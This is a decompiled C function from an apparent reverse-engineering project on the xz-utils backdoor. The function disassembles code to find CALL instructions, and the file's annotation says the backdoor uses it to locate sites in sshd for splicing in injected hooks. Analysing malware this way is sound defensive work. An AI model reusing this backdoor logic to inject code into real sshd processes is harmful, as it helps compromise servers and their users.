// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_call_instruction(u8 * code_start, u8 * code_end, u8 * call_target, dasm_ctx_t * dctx)


/*
 * AutoDoc: Disassembles forward until it encounters a CALL opcode and reports both the instruction and target. The hook finder uses it to locate indirect dispatcher sites in sshd so the injected shims can be spliced in safely.
 */
#include "xzre_types.h"


BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_t *dctx)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  byte bVar4;
  dasm_ctx_t ctx;
  dasm_ctx_t local_80;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
  if (BVar1 != FALSE) {
    pdVar3 = &local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &local_80;
    }
    while (code_start < code_end) {
      BVar1 = x86_dasm(dctx,code_start,code_end);
      if (BVar1 == FALSE) {
        code_start = code_start + 1;
      }
      else {
        if ((*(int *)(dctx->opcode_window + 3) == 0x168) &&
           ((call_target == (u8 *)0x0 ||
            (dctx->instruction + dctx->instruction_size + dctx->operand == call_target)))) {
          return TRUE;
        }
        code_start = code_start + dctx->instruction_size;
      }
    }
  }
  return FALSE;
}

